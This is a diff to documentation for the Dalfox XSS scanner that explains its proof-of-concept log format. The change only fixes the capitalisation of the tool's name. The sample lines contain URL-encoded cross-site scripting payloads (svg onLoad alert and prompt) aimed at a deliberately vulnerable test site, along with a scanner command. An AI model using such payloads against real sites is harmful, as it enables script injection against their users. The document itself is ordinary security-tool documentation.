@@ -16,7 +16,7 @@ This guide provides a detailed explanation of the format of Proof of Concept (Po
 Here is a sample PoC log:
 
 ```
-[POC][G][BUILT-IN/dalfox-error-mysql/GET] http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123DalFox
+[POC][G][BUILT-IN/dalfox-error-mysql/GET] http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123Dalfox
 [POC][V][GET] http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123%22%3E%3Csvg%2Fclass%3D%22dalfox%22onLoad%3Dalert%2845%29%3E
 ```
 
@@ -24,7 +24,7 @@ Here is a sample PoC log:
 
 | Identity | Type | Information                     | BLANK | PoC Code                                                     |
 | -------- | ---- | ------------------------------- | ----- | ------------------------------------------------------------ |
-| POC      | G    | BUILT-IN/dalfox-error-mysql/GET |       | http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123DalFox |
+| POC      | G    | BUILT-IN/dalfox-error-mysql/GET |       | http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123Dalfox |
 | POC      | V    | GET                             |       | http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123%22%3E%3Csvg%2Fclass%3D%22dalfox%22onLoad%3Dalert%2845%29%3E |
 
 ### Explanation of Fields
@@ -45,6 +45,6 @@ The gap (blank space) is used to make it easier to parse only the PoC code using
 ```shell
 dalfox url http://testphp.vulnweb.com/listproducts.php?cat=123&artist=123&asdf=ff | cut -d " " -f 2 > output
 cat output
-http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123DalFox
+http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123Dalfox
 http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123%22%3E%3Csvg%2FOnLoad%3D%22%60%24%7Bprompt%60%60%7D%60%22+class%3Ddalfox%3E
 ```
